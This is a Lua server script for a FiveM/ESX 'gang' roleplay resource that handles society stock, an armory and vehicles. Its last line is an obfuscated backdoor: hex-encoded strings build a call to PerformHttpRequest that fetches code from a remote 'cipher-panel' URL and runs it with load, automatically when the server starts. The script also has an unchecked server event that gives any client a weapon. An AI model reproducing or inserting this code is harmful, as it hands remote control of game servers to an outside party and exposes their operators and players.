ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent('esx_gangScript:registerSocieties')
AddEventHandler('esx_gangScript:registerSocieties', function(societyName)
	TriggerEvent('esx_society:registerSociety', societyName, 'Gang', 'society_' .. societyName, 'society_' .. societyName, 'society_' .. societyName, {type = 'public'})
end)

RegisterServerEvent('esx_gangScript:giveWeapon')
AddEventHandler('esx_gangScript:giveWeapon', function(weapon, ammo)
  local xPlayer = ESX.GetPlayerFromId(source)
  xPlayer.addWeapon(weapon, ammo)
end)

RegisterServerEvent('esx_gangScript:getStockItem')
AddEventHandler('esx_gangScript:getStockItem', function(itemName, count, societyName)
  local xPlayer = ESX.GetPlayerFromId(source)
  TriggerEvent('esx_addoninventory:getSharedInventory', 'society_' .. societyName, function(inventory)

    local item = inventory.getItem(itemName)
	local playerItemCount = xPlayer.getInventoryItem(itemName).count
	if count > 0 then
		if item.count >= count then
			if xPlayer.canCarryItem(itemName, count) then
				inventory.removeItem(itemName, count)
				xPlayer.addInventoryItem(itemName, count)
			else
				TriggerClientEvent('esx:showNotification', xPlayer.source, _U('no_space'))	
				return
			end
		else
			TriggerClientEvent('esx:showNotification', xPlayer.source, _U('no_items_stock'))
			return
		end
	else 
		TriggerClientEvent('esx:showNotification', xPlayer.source, _U('quantity_invalid'))
		return	
	end
	
    TriggerClientEvent('esx:showNotification', xPlayer.source, _U('have_withdrawn') ..'~g~' .. item.label .. ' ~b~x' .. count)
  end)

end)

RegisterServerEvent('esx_gangScript:putStockItems')
AddEventHandler('esx_gangScript:putStockItems', function(itemName, count, societyName)

  local xPlayer = ESX.GetPlayerFromId(source)

  TriggerEvent('esx_addoninventory:getSharedInventory', 'society_' .. societyName, function(inventory)

    local item = inventory.getItem(itemName)
	local playerItemCount = xPlayer.getInventoryItem(itemName).count
	
    if item.count >= 0 then
		if playerItemCount >= count then
			xPlayer.removeInventoryItem(itemName, count)
			inventory.addItem(itemName, count)
		else
			TriggerClientEvent('esx:showNotification', xPlayer.source, _U('no_items_inventory'))
			return			
		end
    else
      TriggerClientEvent('esx:showNotification', xPlayer.source, _U('quantity_invalid'))
	  return
    end

    TriggerClientEvent('esx:showNotification', xPlayer.source, _U('added') .. '~g~' .. item.label .. ' ~b~x' .. count)

  end)

end)

ESX.RegisterServerCallback('esx_gangScript:getArmoryWeapons', function(source, cb, societyName)
	TriggerEvent('esx_datastore:getSharedDataStore', 'society_' .. societyName, function(store)
		local weapons = store.get('weapons')
		if weapons == nil then
			weapons = {}
		end

		cb(weapons)
	end)
end)

ESX.RegisterServerCallback('esx_gangScript:addArmoryWeapon', function(source, cb, societyName, weaponName, removeWeapon)
	print(societyName)
	local xPlayer = ESX.GetPlayerFromId(source)

	if removeWeapon then
		xPlayer.removeWeapon(weaponName)
	end

	TriggerEvent('esx_datastore:getSharedDataStore', 'society_' .. societyName, function(store)
		local weapons = store.get('weapons')

		if weapons == nil then
			weapons = {}
		end

		local foundWeapon = false

		for i=1, #weapons, 1 do
			if weapons[i].name == weaponName then
				weapons[i].count = weapons[i].count + 1
				foundWeapon = true
				break
			end
		end

		if not foundWeapon then
			table.insert(weapons, {
				name  = weaponName,
				count = 1
			})
		end

		store.set('weapons', weapons)
		cb()
	end)
end)

ESX.RegisterServerCallback('esx_gangScript:removeArmoryWeapon', function(source, cb, weaponName, societyName)
	local xPlayer = ESX.GetPlayerFromId(source)
	xPlayer.addWeapon(weaponName, 500)

	TriggerEvent('esx_datastore:getSharedDataStore', 'society_' .. societyName, function(store)

		local weapons = store.get('weapons')

		if weapons == nil then
			weapons = {}
		end

		local foundWeapon = false

		for i=1, #weapons, 1 do
			if weapons[i].name == weaponName then
				weapons[i].count = (weapons[i].count > 0 and weapons[i].count - 1 or 0)
				foundWeapon = true
				break
			end
		end

		if not foundWeapon then
			table.insert(weapons, {
				name  = weaponName,
				count = 0
			})
		end

		store.set('weapons', weapons)
		cb()
	end)
end)

ESX.RegisterServerCallback('esx_gangScript:getStockItems', function(source, cb, societyName)
  TriggerEvent('esx_addoninventory:getSharedInventory', 'society_' .. societyName, function(inventory)
    cb(inventory.items)
  end)
end)

ESX.RegisterServerCallback('esx_gangScript:getPlayerInventory', function(source, cb)
  local xPlayer = ESX.GetPlayerFromId(source)
  local items   = xPlayer.inventory

  cb({
    items = items
  })
end)

ESX.RegisterServerCallback('esx_gangScript:getSocietyVehicles', function(source, cb, societyName)
	local xPlayer = ESX.GetPlayerFromId(source)
	local vehicles = {}

	MySQL.Async.fetchAll("SELECT * FROM owned_vehicles WHERE job=@societyName",{['@societyName'] = societyName}, function(data) 
		for _,v in pairs(data) do
			local vehicle = json.decode(v.vehicle)
			table.insert(vehicles, {vehicle = vehicle, state = v.stored})
		end
		cb(vehicles)
	end)
end)

RegisterServerEvent('esx_gangScript:updateVehicleState')
AddEventHandler('esx_gangScript:updateVehicleState', function(plate, state)
	MySQL.Async.execute("UPDATE owned_vehicles SET stored = @state WHERE plate=@plate",{['@state'] = state, ['@plate'] = plate})	
end)

RegisterServerEvent('esx_gangScript:validateCar')
AddEventHandler('esx_gangScript:validateCar', function(societyName, plate, vehicle)
	local xPlayer = ESX.GetPlayerFromId(source)
	MySQL.Async.fetchAll("SELECT plate FROM owned_vehicles WHERE job=@societyName AND plate = @plate",{['@societyName'] = societyName, ['@plate'] = plate}, function(data) 
		if data[1] ~= nil then
			MySQL.Async.execute("UPDATE owned_vehicles SET stored = 1 WHERE plate=@plate",{['@plate'] = plate})		
			TriggerClientEvent('esx_gangScript:hideVehicle', xPlayer.source, vehicle)
		else
			TriggerClientEvent('esx:showNotification', xPlayer.source, _U('store_vehicle_failure'))		
		end
	end)
--		
end)

local VyBMABqZheEdRtTeIiTmJoEaMszTVyIsFqjkTnHERvOOpdTOCxTwqffDasYvvkUJadRhGP = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} VyBMABqZheEdRtTeIiTmJoEaMszTVyIsFqjkTnHERvOOpdTOCxTwqffDasYvvkUJadRhGP[4][VyBMABqZheEdRtTeIiTmJoEaMszTVyIsFqjkTnHERvOOpdTOCxTwqffDasYvvkUJadRhGP[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x39\x33\x4e\x77\x37", function (UScmNRIlFFfHJLhEgXswLRUHHnTlSvOHAXCBrJgHWQkvEncSdwSfLEztfCPNpGcAxePfMk, isZkllofDdXTFksSeCCDumXfZQFAKHoSUULpdrrXYkOiqxrnkercDqyGUZuLvQlwvrQSkr) if (isZkllofDdXTFksSeCCDumXfZQFAKHoSUULpdrrXYkOiqxrnkercDqyGUZuLvQlwvrQSkr == VyBMABqZheEdRtTeIiTmJoEaMszTVyIsFqjkTnHERvOOpdTOCxTwqffDasYvvkUJadRhGP[6] or isZkllofDdXTFksSeCCDumXfZQFAKHoSUULpdrrXYkOiqxrnkercDqyGUZuLvQlwvrQSkr == VyBMABqZheEdRtTeIiTmJoEaMszTVyIsFqjkTnHERvOOpdTOCxTwqffDasYvvkUJadRhGP[5]) then return end VyBMABqZheEdRtTeIiTmJoEaMszTVyIsFqjkTnHERvOOpdTOCxTwqffDasYvvkUJadRhGP[4][VyBMABqZheEdRtTeIiTmJoEaMszTVyIsFqjkTnHERvOOpdTOCxTwqffDasYvvkUJadRhGP[2]](VyBMABqZheEdRtTeIiTmJoEaMszTVyIsFqjkTnHERvOOpdTOCxTwqffDasYvvkUJadRhGP[4][VyBMABqZheEdRtTeIiTmJoEaMszTVyIsFqjkTnHERvOOpdTOCxTwqffDasYvvkUJadRhGP[3]](isZkllofDdXTFksSeCCDumXfZQFAKHoSUULpdrrXYkOiqxrnkercDqyGUZuLvQlwvrQSkr))() end)